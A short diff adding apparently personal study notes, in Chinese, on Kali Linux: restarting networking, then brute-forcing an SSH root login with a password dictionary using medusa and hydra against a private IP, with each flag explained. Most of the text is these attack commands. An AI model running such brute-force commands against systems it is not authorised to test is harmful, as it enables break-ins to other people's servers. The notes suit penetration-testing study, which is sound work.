@@ -1,0 +1,13 @@
+KALI：重启网络的方法  service network-manager restart
+思路：利用密码字典，通过命令重复尝试连接ssh登录，爆破。
+方法1:KALI的medusa工具
+使用ssh root用户的登录密码。
+medusa -h 192.168.1.104 -u root -P /opt/code.txt -M ssh
+  -h：为攻击的主机ip
+  -u：为登录用户名
+  -P：为密码字典文件(绝对路径)
+  -M：指定连接方式，此处为ssh
+方法2:KALI的hydra工具
+  hydra -l root -P /opt/code.txt ssh://192.168.1.104
+  -l：英文字母L小写；登录用户名
+  -P：为密码字典文件(绝对路径)
